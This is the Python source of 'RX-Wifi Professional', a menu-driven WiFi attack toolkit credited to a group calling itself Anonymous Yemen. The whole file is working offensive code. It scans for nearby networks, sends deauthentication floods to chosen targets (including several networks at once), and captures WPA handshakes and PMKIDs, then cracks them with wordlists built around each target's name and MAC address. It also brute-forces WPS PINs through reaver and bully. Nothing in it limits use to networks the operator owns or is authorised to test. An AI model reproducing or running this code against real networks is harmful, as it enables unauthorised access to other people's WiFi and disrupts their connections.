#!/usr/bin/env python3
# ==============================================================================
# RX-Wifi Professional v4.0
# Advanced WiFi Security Assessment Toolkit
# Developed by: CRZ101 - RX-TEAM
# Organization: ANONYMOUS YEMEN
# ==============================================================================

import os
import time
import subprocess
import threading
import json
import csv
import re
import sys
import hashlib
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==============================================================================
# CONFIGURATION AND CONSTANTS
# ==============================================================================
class Config:
    VERSION = "4.0"
    SUPPORTED_DISTROS = ["kali", "parrot", "ubuntu", "debian"]
    TOOLS = {
        'aircrack': ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng'],
        'wps': ['reaver', 'bully', 'pixiewps'],
        'pmkid': ['hcxdumptool', 'hcxpcaptool', 'hashcat'],
        'general': ['iwconfig', 'iw', 'ip', 'pkill']
    }
    
    WORDLISTS = {
        'default': '/usr/share/wordlists/rockyou.txt',
        'fast': '/usr/share/wordlists/fasttrack.txt',
        'big': '/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt'
    }

# ==============================================================================
# ADVANCED SYSTEM MANAGEMENT
# ==============================================================================
class SystemManager:
    @staticmethod
    def check_root():
        """Verify root privileges"""
        if os.geteuid() != 0:
            print("\033[91m[ERROR] Root privileges required. Run: sudo python3 rxwifi.py\033[0m")
            sys.exit(1)

    @staticmethod
    def install_tools():
        """Install missing tools automatically"""
        missing_tools = []
        
        for category, tools in Config.TOOLS.items():
            for tool in tools:
                if subprocess.call(f"which {tool} >/dev/null 2>&1", shell=True) != 0:
                    missing_tools.append(tool)
        
        if missing_tools:
            print("\033[93m[+] Installing missing tools...\033[0m")
            for tool in missing_tools:
                try:
                    if tool in Config.TOOLS['aircrack']:
                        os.system("apt-get install -y aircrack-ng >/dev/null 2>&1")
                    elif tool in Config.TOOLS['wps']:
                        os.system("apt-get install -y reaver bully pixiewps >/dev/null 2>&1")
                    elif tool in Config.TOOLS['pmkid']:
                        os.system("apt-get install -y hcxtools hashcat >/dev/null 2>&1")
                    print(f"\033[92m[✓] Installed: {tool}\033[0m")
                except Exception as e:
                    print(f"\033[91m[!] Failed to install {tool}: {e}\033[0m")
            time.sleep(2)

    @staticmethod
    def detect_interfaces():
        """Detect available wireless interfaces"""
        interfaces = []
        try:
            # Using iw dev for modern detection
            result = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=10)
            lines = result.stdout.split('\n')
            for i, line in enumerate(lines):
                if "Interface" in line:
                    iface = line.split()[1]
                    interfaces.append(iface)
        except:
            pass
        
        # Fallback to iwconfig
        if not interfaces:
            try:
                result = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=10)
                for line in result.stdout.split('\n'):
                    if "IEEE 802.11" in line and "no wireless" not in line:
                        iface = line.split()[0]
                        interfaces.append(iface)
            except:
                pass
        
        return interfaces if interfaces else ["wlan0"]

    @staticmethod
    def kill_conflicting_processes():
        """Kill processes that may interfere with monitoring"""
        processes = ["NetworkManager", "wpa_supplicant", "dhclient", "avahi-daemon"]
        for proc in processes:
            os.system(f"pkill -9 {proc} >/dev/null 2>&1")
        os.system("airmon-ng check kill >/dev/null 2>&1")
        time.sleep(2)

# ==============================================================================
# INTELLIGENT INTERFACE MANAGEMENT
# ==============================================================================
class InterfaceManager:
    def __init__(self):
        self.original_state = {}
        self.monitor_interface = None
        
    def backup_interface_state(self, interface):
        """Backup original interface configuration"""
        try:
            result = subprocess.run(f"iw dev {interface} info", shell=True, capture_output=True, text=True)
            self.original_state[interface] = result.stdout
        except:
            pass

    def start_monitor_mode(self, interface):
        """Start monitor mode with proper error handling"""
        SystemManager.kill_conflicting_processes()
        
        print(f"\033[94m[+] Starting monitor mode on {interface}...\033[0m")
        
        # Stop interface
        subprocess.run(f"ip link set {interface} down", shell=True)
        
        # Set monitor mode
        result = subprocess.run(f"iw dev {interface} set type monitor", shell=True, capture_output=True, text=True)
        
        if result.returncode != 0:
            print("\033[91m[!] Failed to set monitor mode, trying airmon-ng...\033[0m")
            subprocess.run(f"airmon-ng start {interface} >/dev/null 2>&1", shell=True)
            self.monitor_interface = f"{interface}mon"
        else:
            subprocess.run(f"ip link set {interface} up", shell=True)
            self.monitor_interface = interface
        
        # Verify monitor mode
        if self.verify_monitor_mode():
            print(f"\033[92m[✓] Monitor mode active on {self.monitor_interface}\033[0m")
            return self.monitor_interface
        else:
            print("\033[91m[!] Failed to activate monitor mode\033[0m")
            return None

    def verify_monitor_mode(self):
        """Verify interface is in monitor mode"""
        try:
            result = subprocess.run(f"iw dev {self.monitor_interface} info", shell=True, capture_output=True, text=True)
            return "type monitor" in result.stdout
        except:
            return False

    def restore_interfaces(self):
        """Restore interfaces to original state"""
        print("\033[94m[+] Restoring network interfaces...\033[0m")
        os.system("airmon-ng check kill >/dev/null 2>&1")
        os.system("systemctl start NetworkManager >/dev/null 2>&1")
        time.sleep(3)

# ==============================================================================
# ADVANCED NETWORK SCANNER
# ==============================================================================
class NetworkScanner:
    def __init__(self, interface):
        self.interface = interface
        self.networks = []
        
    def scan_networks(self, duration=15):
        """Perform comprehensive network scan"""
        print(f"\033[94m[+] Scanning for networks ({duration} seconds)...\033[0m")
        
        # Remove previous scan files
        os.system("rm -f /tmp/scan-*.csv /tmp/scan-*.kismet.csv >/dev/null 2>&1")
        
        # Start airodump-ng
        cmd = f"airodump-ng -w /tmp/scan --output-format csv {self.interface}"
        process = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Progress counter
        for i in range(duration, 0, -1):
            print(f"\r\033[93m[+] Scanning... {i}s remaining\033[0m", end='', flush=True)
            time.sleep(1)
        
        process.terminate()
        os.system("pkill airodump-ng >/dev/null 2>&1")
        print("\n\033[92m[✓] Scan completed!\033[0m")
        
        return self.parse_scan_results()

    def parse_scan_results(self):
        """Parse airodump-ng results with robust error handling"""
        csv_files = [f for f in os.listdir('/tmp/') if f.startswith('scan-') and f.endswith('.csv')]
        
        if not csv_files:
            print("\033[91m[!] No scan data found\033[0m")
            return []
        
        csv_file = f"/tmp/{csv_files[0]}"
        networks = []
        
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                lines = content.split('\n')
                
                in_networks = False
                for line in lines:
                    if 'BSSID' in line and 'ESSID' in line:
                        in_networks = True
                        continue
                    
                    if 'Station MAC' in line:
                        break
                    
                    if in_networks and line.strip():
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) >= 14:
                            bssid = parts[0]
                            first_seen = parts[1]
                            last_seen = parts[2]
                            channel = parts[3]
                            speed = parts[4]
                            privacy = parts[5]
                            cipher = parts[6]
                            authentication = parts[7]
                            power = parts[8]
                            beacons = parts[9]
                            iv = parts[10]
                            lan_ip = parts[11]
                            id_length = parts[12]
                            essid = parts[13]
                            
                            # Filter meaningful networks
                            if bssid and bssid != '00:00:00:00:00:00' and power and power != '-1':
                                networks.append({
                                    'bssid': bssid,
                                    'essid': essid,
                                    'channel': channel,
                                    'power': power,
                                    'privacy': privacy,
                                    'cipher': cipher,
                                    'authentication': authentication
                                })
            
            # Sort by signal power
            networks.sort(key=lambda x: int(x['power']) if x['power'].lstrip('-').isdigit() else -100, reverse=True)
            
        except Exception as e:
            print(f"\033[91m[!] Error parsing scan results: {e}\033[0m")
        
        return networks

    def display_networks(self, networks):
        """Display networks in formatted table"""
        if not networks:
            print("\033[91m[!] No networks found\033[0m")
            return
        
        print("\n\033[94m[+] Discovered Networks:\033[0m")
        print("=" * 90)
        print(f"{'#':<3} {'BSSID':<18} {'ESSID':<25} {'Channel':<8} {'Power':<6} {'Encryption':<12}")
        print("=" * 90)
        
        for i, net in enumerate(networks[:25], 1):
            essid = net['essid'] if net['essid'] else 'Hidden'
            if len(essid) > 24:
                essid = essid[:21] + "..."
            
            print(f"{i:<3} {net['bssid']:<18} {essid:<25} {net['channel']:<8} {net['power']:<6} {net['privacy']:<12}")
        
        print("=" * 90)
        return networks

# ==============================================================================
# INTELLIGENT WORDLIST GENERATOR
# ==============================================================================
class SmartWordlistGenerator:
    def __init__(self):
        self.common_passwords = [
            'password', 'admin', '12345678', '1234567890', 'wireless',
            'default', 'root', 'wifi', 'internet', 'security'
        ]
        
    def generate_contextual_wordlist(self, essid, bssid, vendor=None):
        """Generate intelligent wordlist based on target context"""
        words = set()
        
        # Clean inputs
        essid_clean = re.sub(r'[^a-zA-Z0-9]', '', essid.lower())
        bssid_clean = bssid.replace(':', '').lower()
        
        # ESSID-based patterns
        essid_variations = self.generate_essid_variations(essid_clean)
        words.update(essid_variations)
        
        # BSSID-based patterns
        bssid_variations = self.generate_bssid_variations(bssid_clean)
        words.update(bssid_variations)
        
        # Vendor-based patterns (if vendor detected)
        if vendor:
            vendor_patterns = self.generate_vendor_patterns(vendor)
            words.update(vendor_patterns)
        
        # Common password patterns
        words.update(self.common_passwords)
        
        # Number sequences and patterns
        number_patterns = self.generate_number_patterns()
        words.update(number_patterns)
        
        # Combine patterns
        combined = self.generate_combined_patterns(list(words)[:50])
        words.update(combined)
        
        # Save wordlist
        filename = f"wordlist_{essid_clean[:15]}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for word in words:
                if 8 <= len(word) <= 63:  # WPA2 password length constraints
                    f.write(word + '\n')
        
        print(f"\033[92m[✓] Generated wordlist: {filename} ({len(words)} entries)\033[0m")
        return filename

    def generate_essid_variations(self, essid):
        """Generate ESSID-based password variations"""
        variations = set()
        
        if not essid:
            return variations
            
        # Basic variations
        variations.add(essid)
        variations.add(essid + '123')
        variations.add(essid + '1234')
        variations.add(essid + '123456')
        variations.add(essid + '!')
        variations.add(essid + '@')
        variations.add(essid + '#')
        
        # Case variations
        variations.add(essid.upper())
        variations.add(essid.capitalize())
        
        return variations

    def generate_bssid_variations(self, bssid):
        """Generate BSSID-based password variations"""
        variations = set()
        
        if not bssid:
            return variations
            
        # Last 4 digits
        last_4 = bssid[-4:]
        variations.add(last_4)
        
        # Last 6 digits
        last_6 = bssid[-6:]
        variations.add(last_6)
        
        # Full BSSID without colons
        variations.add(bssid)
        
        return variations

    def generate_vendor_patterns(self, vendor):
        """Generate vendor-specific patterns"""
        vendor_patterns = {
            'Cisco': ['cisco', 'Cisco', 'CISCO', 'ciscosb'],
            'TP-Link': ['tp-link', 'TPLINK', 'tplink', 'admin'],
            'Netgear': ['netgear', 'NETGEAR', 'admin', 'password'],
            'Linksys': ['linksys', 'LINKSYS', 'admin'],
            'D-Link': ['dlink', 'DLINK', 'admin']
        }
        
        return vendor_patterns.get(vendor, [])

    def generate_number_patterns(self):
        """Generate common number sequences"""
        patterns = set()
        
        # Year patterns
        for year in range(2010, 2025):
            patterns.add(str(year))
        
        # Common sequences
        sequences = ['12345678', '123456789', '1234567890', '11111111', '00000000']
        patterns.update(sequences)
        
        return patterns

    def generate_combined_patterns(self, base_words):
        """Generate combined word patterns"""
        combined = set()
        
        for word in base_words[:20]:  # Limit to prevent explosion
            for suffix in ['!', '@', '#', '123', '2024', '2023']:
                combined.add(word + suffix)
        
        return combined

# ==============================================================================
# ADVANCED WPA/WPA2 HANDLER
# ==============================================================================
class WPAHandshakeManager:
    def __init__(self, interface):
        self.interface = interface
        self.handshake_captured = False
        
    def capture_handshake(self, target_bssid, target_channel, output_file="handshake"):
        """Capture WPA handshake with advanced techniques"""
        print(f"\033[94m[+] Starting handshake capture on {target_bssid}...\033[0m")
        
        # Start capture
        capture_cmd = f"airodump-ng -c {target_channel} --bssid {target_bssid} -w {output_file} {self.interface}"
        capture_process = subprocess.Popen(capture_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(8)  # Wait for airodump to stabilize
        
        # Deauth attack in separate thread
        def deauth_attack():
            for i in range(3):  # Multiple deauth attempts
                deauth_cmd = f"aireplay-ng --deauth 5 -a {target_bssid} {self.interface}"
                os.system(deauth_cmd + " >/dev/null 2>&1")
                time.sleep(10)
        
        deauth_thread = threading.Thread(target=deauth_attack)
        deauth_thread.start()
        
        # Monitor for handshake
        print("\033[94m[+] Monitoring for handshake (60 seconds)...\033[0m")
        handshake_detected = False
        
        for i in range(60):
            if self.check_handshake(f"{output_file}-01.cap"):
                handshake_detected = True
                break
            time.sleep(1)
        
        # Cleanup
        capture_process.terminate()
        deauth_thread.join(timeout=5)
        os.system("pkill airodump-ng >/dev/null 2>&1")
        
        if handshake_detected:
            print("\033[92m[✓] WPA Handshake captured successfully!\033[0m")
            
            # Move to captures directory
            if not os.path.exists('captures'):
                os.makedirs('captures')
            os.system(f"mv {output_file}* captures/ 2>/dev/null")
            
            return f"captures/{output_file}-01.cap"
        else:
            print("\033[91m[!] No handshake captured\033[0m")
            os.system(f"rm -f {output_file}* 2>/dev/null")
            return None

    def check_handshake(self, cap_file):
        """Check if capture file contains handshake"""
        if not os.path.exists(cap_file):
            return False
        
        try:
            result = subprocess.run(
                f"aircrack-ng {cap_file} 2>/dev/null | grep '1 handshake'",
                shell=True, capture_output=True, text=True
            )
            return result.returncode == 0
        except:
            return False

    def crack_handshake(self, cap_file, wordlist=None):
        """Crack handshake with selected wordlist"""
        if not wordlist:
            print("\033[94m[+] Available wordlists:\033[0m")
            print("1. rockyou.txt (comprehensive)")
            print("2. fasttrack.txt (quick)")
            print("3. Custom wordlist")
            print("4. Generate smart wordlist")
            
            choice = input("\n[+] Select option: ").strip()
            
            if choice == "1":
                wordlist = Config.WORDLISTS['default']
            elif choice == "2":
                wordlist = Config.WORDLISTS['fast']
            elif choice == "3":
                wordlist = input("[+] Enter wordlist path: ").strip()
            elif choice == "4":
                essid = input("[+] Enter target ESSID: ")
                bssid = input("[+] Enter target BSSID: ")
                generator = SmartWordlistGenerator()
                wordlist = generator.generate_contextual_wordlist(essid, bssid)
            else:
                print("\033[91m[!] Invalid choice\033[0m")
                return
        
        if not os.path.exists(wordlist):
            print("\033[91m[!] Wordlist not found\033[0m")
            return
        
        print(f"\033[94m[+] Cracking with {wordlist}...\033[0m")
        os.system(f"aircrack-ng -w {wordlist} {cap_file}")

# ==============================================================================
# WPS ATTACK MANAGER
# ==============================================================================
class WPSAttackManager:
    def __init__(self, interface):
        self.interface = interface
        
    def check_wps_vulnerability(self, bssid, channel):
        """Check if target is vulnerable to WPS attacks"""
        print(f"\033[94m[+] Checking WPS vulnerability for {bssid}...\033[0m")
        
        # Try wash first to detect WPS
        wash_cmd = f"wash -i {self.interface} -c {channel} -s"
        result = os.system(wash_cmd + " >/dev/null 2>&1")
        
        if result == 0:
            return True
        
        # Try reaver pin discovery
        reaver_cmd = f"reaver -i {self.interface} -b {bssid} -c {channel} -f -q"
        result = os.system(reaver_cmd + " >/dev/null 2>&1")
        
        return result == 0

    def execute_wps_attack(self, bssid, channel):
        """Execute comprehensive WPS attack"""
        print(f"\033[94m[+] Starting WPS attack on {bssid}...\033[0m")
        
        # Try bully first (often faster)
        print("\033[94m[+] Attempting with bully...\033[0m")
        bully_cmd = f"bully -b {bssid} -c {channel} -v 3 {self.interface}"
        result = os.system(bully_cmd)
        
        if result == 0:
            print("\033[92m[✓] WPS attack successful with bully!\033[0m")
            return True
        
        # Try reaver if bully fails
        print("\033[94m[+] Attempting with reaver...\033[0m")
        reaver_cmd = f"reaver -i {self.interface} -b {bssid} -c {channel} -K -vv"
        result = os.system(reaver_cmd)
        
        if result == 0:
            print("\033[92m[✓] WPS attack successful with reaver!\033[0m")
            return True
        
        print("\033[91m[!] WPS attack failed\033[0m")
        return False

# ==============================================================================
# PMKID ATTACK MANAGER
# ==============================================================================
class PMKIDAttackManager:
    def __init__(self, interface):
        self.interface = interface
        
    def capture_pmkid(self, bssid, duration=60):
        """Capture PMKID using hcxdumptool"""
        if subprocess.call("which hcxdumptool >/dev/null 2>&1", shell=True) != 0:
            print("\033[91m[!] hcxdumptool not installed\033[0m")
            return None
        
        output_file = f"pmkid_{int(time.time())}"
        
        print(f"\033[94m[+] Capturing PMKID for {bssid} ({duration} seconds)...\033[0m")
        
        # Start PMKID capture
        capture_cmd = f"hcxdumptool -i {self.interface} -o {output_file}.pcapng --enable_status=1 --filterlist_ap={bssid} --filtermode=2"
        capture_process = subprocess.Popen(capture_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Wait for capture
        for i in range(duration, 0, -1):
            print(f"\r\033[93m[+] Capturing... {i}s remaining\033[0m", end='', flush=True)
            time.sleep(1)
        
        capture_process.terminate()
        print()
        
        # Convert to hash format
        if os.path.exists(f"{output_file}.pcapng"):
            print("\033[94m[+] Converting capture to hash format...\033[0m")
            os.system(f"hcxpcaptool -z {output_file}.hash {output_file}.pcapng >/dev/null 2>&1")
            
            if os.path.exists(f"{output_file}.hash"):
                print("\033[92m[✓] PMKID hash captured successfully!\033[0m")
                return f"{output_file}.hash"
        
        print("\033[91m[!] PMKID capture failed\033[0m")
        return None

    def crack_pmkid(self, hash_file):
        """Crack PMKID hash with hashcat"""
        if not os.path.exists(hash_file):
            print("\033[91m[!] Hash file not found\033[0m")
            return
        
        wordlist = input("[+] Enter wordlist path [rockyou.txt]: ").strip() or Config.WORDLISTS['default']
        
        if not os.path.exists(wordlist):
            print("\033[91m[!] Wordlist not found\033[0m")
            return
        
        print("\033[94m[+] Cracking PMKID with hashcat...\033[0m")
        os.system(f"hashcat -m 16800 {hash_file} {wordlist} --force")

# ==============================================================================
# PARALLEL ATTACK MANAGER
# ==============================================================================
class ParallelAttackManager:
    def __init__(self, interface):
        self.interface = interface
        
    def execute_parallel_deauth(self, targets):
        """Execute deauth attacks on multiple targets simultaneously"""
        print(f"\033[94m[+] Starting parallel deauth on {len(targets)} targets...\033[0m")
        
        def deauth_target(target):
            bssid, channel, essid = target
            try:
                print(f"\033[93m[+] Deauthing: {essid} ({bssid})\033[0m")
                cmd = f"aireplay-ng --deauth 10 -a {bssid} {self.interface}"
                os.system(cmd + " >/dev/null 2>&1")
                return f"✓ Completed: {essid}"
            except Exception as e:
                return f"✗ Failed: {essid} - {e}"
        
        # Execute in parallel
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [executor.submit(deauth_target, target) for target in targets]
            for future in as_completed(futures):
                print(future.result())

# ==============================================================================
# MAIN APPLICATION
# ==============================================================================
class RXWifiPro:
    def __init__(self):
        self.interface_manager = InterfaceManager()
        self.scanner = None
        self.current_networks = []
        
    def display_banner(self):
        """Display application banner"""
        os.system("clear")
        print(r"""
██████╗ ██╗  ██╗    ██╗    ██╗██╗███████╗██╗███████╗
██╔══██╗╚██╗██╔╝    ██║    ██║██║██╔════╝██║██╔════╝
██████╔╝ ╚███╔╝     ██║ █╗ ██║██║█████╗  ██║███████╗
██╔══██╗ ██╔██╗     ██║███╗██║██║██╔══╝  ██║╚════██║
██║  ██║██╔╝ ██╗    ╚███╔███╔╝██║██║     ██║███████║
╚═╝  ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚══════╝
        """)
        print(f"\033[94mProfessional WiFi Security Toolkit v{Config.VERSION}\033[0m")
        print("\033[93mDeveloped by: CRZ101 - RX-TEAM | ANONYMOUS YEMEN\033[0m")
        print("\033[96m" + "="*60 + "\033[0m")

    def main_menu(self):
        """Display main menu"""
        while True:
            self.display_banner()
            print("""
\033[1mCORE OPERATIONS:\033[0m
  [1] 📡 Interface Management
  [2] 🌐 Network Discovery
  [3] 🔓 WPA/WPA2 Attacks
  [4] 📶 WPS Attacks
  [5] 🔑 PMKID Attacks
  [6] ⚡ Parallel Operations
  [7] 🛠️ Utilities
  [8] ❌ Exit

\033[96m" + "="*60 + "\033[0m
            """)
            
            choice = input("\n[+] Select option: ").strip()
            
            if choice == "1":
                self.interface_menu()
            elif choice == "2":
                self.scan_menu()
            elif choice == "3":
                self.wpa_menu()
            elif choice == "4":
                self.wps_menu()
            elif choice == "5":
                self.pmkid_menu()
            elif choice == "6":
                self.parallel_menu()
            elif choice == "7":
                self.utilities_menu()
            elif choice == "8":
                self.cleanup_exit()
                break
            else:
                print("\033[91m[!] Invalid option\033[0m")
                time.sleep(1)

    def interface_menu(self):
        """Interface management menu"""
        while True:
            self.display_banner()
            print("""
\033[1mINTERFACE MANAGEMENT:\033[0m
  [1] 🔍 Detect Interfaces
  [2] 🎯 Start Monitor Mode
  [3] 🔄 Restore Interfaces
  [4] 📊 Interface Status
  [5] ↩️ Back

            """)
            
            choice = input("[+] Select option: ").strip()
            
            if choice == "1":
                interfaces = SystemManager.detect_interfaces()
                print(f"\033[92m[+] Available interfaces: {interfaces}\033[0m")
            elif choice == "2":
                interfaces = SystemManager.detect_interfaces()
                if interfaces:
                    print(f"\033[94m[+] Available: {interfaces}\033[0m")
                    interface = input(f"[+] Select interface [{interfaces[0]}]: ").strip() or interfaces[0]
                    self.interface_manager.start_monitor_mode(interface)
                    self.scanner = NetworkScanner(self.interface_manager.monitor_interface)
                else:
                    print("\033[91m[!] No wireless interfaces found\033[0m")
            elif choice == "3":
                self.interface_manager.restore_interfaces()
            elif choice == "4":
                os.system("iwconfig 2>/dev/null | grep -E '^[a-z]' | grep -v 'no wireless'")
            elif choice == "5":
                break
            else:
                print("\033[91m[!] Invalid option\033[0m")
            
            input("\n[+] Press Enter to continue...")

    def scan_menu(self):
        """Network scanning menu"""
        if not self.scanner:
            print("\033[91m[!] Start monitor mode first!\033[0m")
            time.sleep(2)
            return
        
        while True:
            self.display_banner()
            print("""
\033[1mNETWORK DISCOVERY:\033[0m
  [1] 🔍 Quick Scan (15s)
  [2] 🔎 Deep Scan (30s)
  [3] 📊 Display Results
  [4] 💾 Save Results
  [5] ↩️ Back

            """)
            
            choice = input("[+] Select option: ").strip()
            
            if choice == "1":
                self.current_networks = self.scanner.scan_networks(15)
                self.scanner.display_networks(self.current_networks)
            elif choice == "2":
                self.current_networks = self.scanner.scan_networks(30)
                self.scanner.display_networks(self.current_networks)
            elif choice == "3":
                if self.current_networks:
                    self.scanner.display_networks(self.current_networks)
                else:
                    print("\033[91m[!] No scan data available\033[0m")
            elif choice == "4":
                self.save_scan_results()
            elif choice == "5":
                break
            else:
                print("\033[91m[!] Invalid option\033[0m")
            
            input("\n[+] Press Enter to continue...")

    def wpa_menu(self):
        """WPA/WPA2 attack menu"""
        if not self.scanner or not self.current_networks:
            print("\033[91m[!] Scan for networks first!\033[0m")
            time.sleep(2)
            return
        
        self.scanner.display_networks(self.current_networks)
        
        try:
            choice = int(input("\n[+] Select target network: "))
            if 1 <= choice <= len(self.current_networks):
                target = self.current_networks[choice-1]
                wpa_manager = WPAHandshakeManager(self.scanner.interface)
                
                print(f"\033[94m[+] Target: {target['essid']} ({target['bssid']})\033[0m")
                
                # Capture handshake
                cap_file = wpa_manager.capture_handshake(
                    target['bssid'], 
                    target['channel'],
                    f"handshake_{int(time.time())}"
                )
                
                if cap_file:
                    crack_now = input("\n[+] Crack password now? (y/n): ").lower()
                    if crack_now == 'y':
                        wpa_manager.crack_handshake(cap_file)
            else:
                print("\033[91m[!] Invalid selection\033[0m")
        except ValueError:
            print("\033[91m[!] Invalid input\033[0m")
        
        input("\n[+] Press Enter to continue...")

    def wps_menu(self):
        """WPS attack menu"""
        if not self.scanner or not self.current_networks:
            print("\033[91m[!] Scan for networks first!\033[0m")
            time.sleep(2)
            return
        
        self.scanner.display_networks(self.current_networks)
        
        try:
            choice = int(input("\n[+] Select target network: "))
            if 1 <= choice <= len(self.current_networks):
                target = self.current_networks[choice-1]
                wps_manager = WPSAttackManager(self.scanner.interface)
                
                # Check WPS vulnerability
                if wps_manager.check_wps_vulnerability(target['bssid'], target['channel']):
                    print("\033[92m[✓] Target appears WPS vulnerable\033[0m")
                    proceed = input("[+] Proceed with attack? (y/n): ").lower()
                    if proceed == 'y':
                        wps_manager.execute_wps_attack(target['bssid'], target['channel'])
                else:
                    print("\033[91m[!] Target does not appear WPS vulnerable\033[0m")
            else:
                print("\033[91m[!] Invalid selection\033[0m")
        except ValueError:
            print("\033[91m[!] Invalid input\033[0m")
        
        input("\n[+] Press Enter to continue...")

    def pmkid_menu(self):
        """PMKID attack menu"""
        if not self.scanner or not self.current_networks:
            print("\033[91m[!] Scan for networks first!\033[0m")
            time.sleep(2)
            return
        
        self.scanner.display_networks(self.current_networks)
        
        try:
            choice = int(input("\n[+] Select target network: "))
            if 1 <= choice <= len(self.current_networks):
                target = self.current_networks[choice-1]
                pmkid_manager = PMKIDAttackManager(self.scanner.interface)
                
                # Capture PMKID
                hash_file = pmkid_manager.capture_pmkid(target['bssid'])
                
                if hash_file:
                    crack_now = input("\n[+] Crack PMKID now? (y/n): ").lower()
                    if crack_now == 'y':
                        pmkid_manager.crack_pmkid(hash_file)
            else:
                print("\033[91m[!] Invalid selection\033[0m")
        except ValueError:
            print("\033[91m[!] Invalid input\033[0m")
        
        input("\n[+] Press Enter to continue...")

    def parallel_menu(self):
        """Parallel operations menu"""
        if not self.scanner or not self.current_networks:
            print("\033[91m[!] Scan for networks first!\033[0m")
            time.sleep(2)
            return
        
        self.scanner.display_networks(self.current_networks)
        
        try:
            print("\033[94m[+] Select targets for parallel deauth (comma-separated):\033[0m")
            choices = input("[+] Target numbers: ").split(',')
            
            targets = []
            for choice in choices:
                idx = int(choice.strip()) - 1
                if 0 <= idx < len(self.current_networks):
                    target = self.current_networks[idx]
                    targets.append((target['bssid'], target['channel'], target['essid']))
            
            if targets:
                parallel_manager = ParallelAttackManager(self.scanner.interface)
                parallel_manager.execute_parallel_deauth(targets)
            else:
                print("\033[91m[!] No valid targets selected\033[0m")
        except ValueError:
            print("\033[91m[!] Invalid input\033[0m")
        
        input("\n[+] Press Enter to continue...")

    def utilities_menu(self):
        """Utilities menu"""
        while True:
            self.display_banner()
            print("""
\033[1mUTILITIES:\033[0m
  [1] 🧠 Generate Smart Wordlist
  [2] 📋 Check Dependencies
  [3] 🗑️ Cleanup System
  [4] 💾 Backup Results
  [5] ↩️ Back

            """)
            
            choice = input("[+] Select option: ").strip()
            
            if choice == "1":
                essid = input("[+] Enter target ESSID: ")
                bssid = input("[+] Enter target BSSID: ")
                generator = SmartWordlistGenerator()
                generator.generate_contextual_wordlist(essid, bssid)
            elif choice == "2":
                SystemManager.install_tools()
            elif choice == "3":
                self.cleanup_system()
            elif choice == "4":
                self.backup_results()
            elif choice == "5":
                break
            else:
                print("\033[91m[!] Invalid option\033[0m")
            
            input("\n[+] Press Enter to continue...")

    def save_scan_results(self):
        """Save scan results to file"""
        if not self.current_networks:
            print("\033[91m[!] No scan data to save\033[0m")
            return
        
        filename = f"scan_results_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(self.current_networks, f, indent=2)
        print(f"\033[92m[✓] Results saved to {filename}\033[0m")

    def backup_results(self):
        """Backup all results and captures"""
        backup_dir = f"backup_{int(time.time())}"
        os.makedirs(backup_dir, exist_ok=True)
        
        os.system(f"cp -r captures/ {backup_dir}/ 2>/dev/null")
        os.system(f"cp *.txt {backup_dir}/ 2>/dev/null")
        os.system(f"cp *.json {backup_dir}/ 2>/dev/null")
        os.system(f"cp *.hash {backup_dir}/ 2>/dev/null")
        
        print(f"\033[92m[✓] Backup created: {backup_dir}\033[0m")

    def cleanup_system(self):
        """Cleanup system state"""
        print("\033[94m[+] Cleaning up system...\033[0m")
        self.interface_manager.restore_interfaces()
        os.system("pkill airodump-ng aireplay-ng reaver bully hcxdumptool 2>/dev/null")
        os.system("rm -f /tmp/scan-* *.cap *.pcapng 2>/dev/null")
        print("\033[92m[✓] System cleaned\033[0m")

    def cleanup_exit(self):
        """Cleanup and exit"""
        print("\033[94m[+] Performing cleanup...\033[0m")
        self.cleanup_system()
        print("\033[92m[+] Thank you for using RX-Wifi Professional!\033[0m")
        sys.exit(0)

# ==============================================================================
# APPLICATION ENTRY POINT
# ==============================================================================
def main():
    """Main application entry point"""
    try:
        # System checks
        SystemManager.check_root()
        SystemManager.install_tools()
        
        # Start application
        app = RXWifiPro()
        app.main_menu()
        
    except KeyboardInterrupt:
        print("\n\033[92m[+] Program terminated by user\033[0m")
        sys.exit(0)
    except Exception as e:
        print(f"\033[91m[!] Critical error: {e}\033[0m")
        sys.exit(1)

if __name__ == "__main__":
    main()
